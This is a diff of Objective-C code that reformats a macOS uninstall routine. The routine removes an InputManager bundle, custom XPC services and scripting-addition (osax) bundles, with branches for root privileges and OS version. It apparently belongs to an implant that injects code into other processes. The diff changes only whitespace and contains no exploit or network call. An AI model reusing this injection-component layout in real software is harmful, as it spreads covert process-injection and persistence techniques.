@@ -467,94 +467,94 @@ static NSLock *gSyncLock                  = nil;
       NSString *osaxRootPath = nil;
 
       if (getuid() == 0 || geteuid() == 0)
-      {
+        {
           if ([gUtil isLeopard])
-          {
+            {
 #ifdef DEBUG_TASK_MANAGER
               infoLog(@"Removing input manager");
 #endif
               destDir = [[NSString alloc]
-                         initWithFormat: @"/Library/InputManagers/%@",
-                                         EXT_BUNDLE_FOLDER];
-              
+                initWithFormat: @"/Library/InputManagers/%@",
+                EXT_BUNDLE_FOLDER];
+
               if (![[NSFileManager defaultManager] removeItemAtPath: destDir
                                                               error: &err])
-              {
+                {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-                errorLog(@"Error while removing the xpc service");
-                errorLog(@"error: %@", [err localizedDescription]);
+                  errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                  errorLog(@"Error while removing the xpc service");
+                  errorLog(@"error: %@", [err localizedDescription]);
 #endif
-              }
-              
+                }
+
               [destDir release];
             }
           else
-          {
-            // is Snow Leopard
-            osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
-                            OSAX_ROOT_PATH];
-            
-            if ([gUtil isLion])
             {
-              destDir = [[NSString alloc]
-                         initWithFormat: @"%@/%@%@.xpc",
-                         XPC_BUNDLE_FRAMEWORK_PATH,
-                         XPC_BUNDLE_FOLDER_PREFIX,
-                         gMyXPCName];
+              // is Snow Leopard
+              osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
+                           OSAX_ROOT_PATH];
+
+              if ([gUtil isLion])
+                {
+                  destDir = [[NSString alloc]
+                    initWithFormat: @"%@/%@%@.xpc",
+                    XPC_BUNDLE_FRAMEWORK_PATH,
+                    XPC_BUNDLE_FOLDER_PREFIX,
+                    gMyXPCName];
 #ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Removing xpc services %@", destDir);
+                  infoLog(@"Removing xpc services %@", destDir);
 #endif
-              if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                              error: &err])
-              {
+                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                                  error: &err])
+                    {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-                errorLog(@"Error while removing the xpc service");
-                errorLog(@"error: %@", [err localizedDescription]);
+                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                      errorLog(@"Error while removing the xpc service");
+                      errorLog(@"error: %@", [err localizedDescription]);
 #endif
-              }
-              
-              [destDir release];
+                    }
+
+                  [destDir release];
+                }
             }
-          }
-      }
+        }
       else
-      {
+        {
 #ifdef DEBUG_TASK_MANAGER
-        errorLog(@"I don't have privileges for removing the input manager :(");
-        errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+          errorLog(@"I don't have privileges for removing the input manager :(");
+          errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
 #endif
-        osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                        NSUserName(),
-                        OSAX_ROOT_PATH];
-      }
+          osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
+                       NSUserName(),
+                       OSAX_ROOT_PATH];
+        }
 
       // if not leopard remove osax
       if (osaxRootPath != nil)
-      {
-        
-#ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Removing scripting additions");
-#endif
-        destDir = [[NSString alloc]
-                   initWithFormat: @"%@/%@",
-                   osaxRootPath,
-                   EXT_BUNDLE_FOLDER];
-        
-        if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                        error: &err])
         {
+
 #ifdef DEBUG_TASK_MANAGER
-          errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-          errorLog(@"Error while removing the osax");
-          errorLog(@"error: %@", [err localizedDescription]);
+          infoLog(@"Removing scripting additions");
 #endif
+          destDir = [[NSString alloc]
+            initWithFormat: @"%@/%@",
+            osaxRootPath,
+            EXT_BUNDLE_FOLDER];
+
+          if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                          error: &err])
+            {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+              errorLog(@"Error while removing the osax");
+              errorLog(@"error: %@", [err localizedDescription]);
+#endif
+            }
+
+          [destDir release];
         }
-        
-        [destDir release];
-      }
-      
+
     }
   else
     {
